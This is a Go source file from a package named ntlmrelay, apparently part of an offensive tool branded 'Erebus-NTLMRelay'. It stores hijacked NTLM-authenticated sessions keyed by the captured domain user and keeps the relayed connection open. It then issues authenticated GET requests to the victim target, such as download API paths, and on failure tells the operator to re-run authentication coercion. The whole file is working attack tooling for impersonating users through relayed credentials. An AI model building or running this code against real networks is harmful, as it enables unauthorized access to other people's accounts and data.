package ntlmrelay

import (
	"fmt"
	"io"
	"net/http"
	"sync"
	"sync/atomic"
	"time"
)

// Session is a held authenticated HTTP client (sticky conn) to the relay target.
type Session struct {
	ID        int
	Domain    string
	User      string
	Target    string
	CreatedAt time.Time

	mu     sync.Mutex
	client *http.Client
	sticky *stickyTransport
}

// Identity returns DOMAIN\user.
func (s *Session) Identity() string {
	if s.Domain != "" {
		return s.Domain + `\` + s.User
	}
	return s.User
}

// Close releases the sticky target connection.
func (s *Session) Close() {
	s.mu.Lock()
	defer s.mu.Unlock()
	if s.sticky != nil {
		_ = s.sticky.Close()
		s.sticky = nil
	}
	s.client = nil
}

// SessionStore tracks active relay sessions.
type SessionStore struct {
	mu       sync.Mutex
	nextID   atomic.Int64
	sessions map[int]*Session
}

// NewSessionStore creates an empty store.
func NewSessionStore() *SessionStore {
	return &SessionStore{sessions: make(map[int]*Session)}
}

// Add registers a session and returns its ID.
func (st *SessionStore) Add(s *Session) int {
	id := int(st.nextID.Add(1))
	s.ID = id
	s.CreatedAt = time.Now()
	st.mu.Lock()
	st.sessions[id] = s
	st.mu.Unlock()
	return id
}

// Get returns a session by ID.
func (st *SessionStore) Get(id int) (*Session, error) {
	st.mu.Lock()
	defer st.mu.Unlock()
	s, ok := st.sessions[id]
	if !ok {
		return nil, fmt.Errorf("session %d not found", id)
	}
	return s, nil
}

// List returns a snapshot of sessions.
func (st *SessionStore) List() []*Session {
	st.mu.Lock()
	defer st.mu.Unlock()
	out := make([]*Session, 0, len(st.sessions))
	for _, s := range st.sessions {
		out = append(out, s)
	}
	return out
}

// CloseAll closes every session's sticky connection.
func (st *SessionStore) CloseAll() {
	st.mu.Lock()
	defer st.mu.Unlock()
	for id, s := range st.sessions {
		s.Close()
		delete(st.sessions, id)
	}
}

// GetBody performs an authenticated GET on the target using the held sticky session.
// path should be absolute URL path (e.g. /api/download/...). Empty uses target as-is.
func (s *Session) GetBody(path string) (status int, body []byte, err error) {
	s.mu.Lock()
	defer s.mu.Unlock()
	if s.client == nil {
		return 0, nil, fmt.Errorf("session has no client")
	}
	u := s.Target
	if path != "" {
		if path[0] != '/' {
			path = "/" + path
		}
		u = replaceURLPath(s.Target, path)
	}
	req, err := http.NewRequest(http.MethodGet, u, nil)
	if err != nil {
		return 0, nil, err
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Erebus-NTLMRelay")
	req.Header.Set("Connection", "Keep-Alive")
	// Connection-bound NTLM: no Authorization header; same TCP conn as Type3.
	resp, err := s.client.Do(req)
	if err != nil {
		return 0, nil, err
	}
	defer resp.Body.Close()
	b, err := io.ReadAll(io.LimitReader(resp.Body, 64<<20))
	if err != nil {
		return resp.StatusCode, nil, err
	}
	if resp.StatusCode == http.StatusUnauthorized {
		return resp.StatusCode, b, fmt.Errorf("session lost NTLM context (401); re-run coerce against the relay listener")
	}
	return resp.StatusCode, b, nil
}
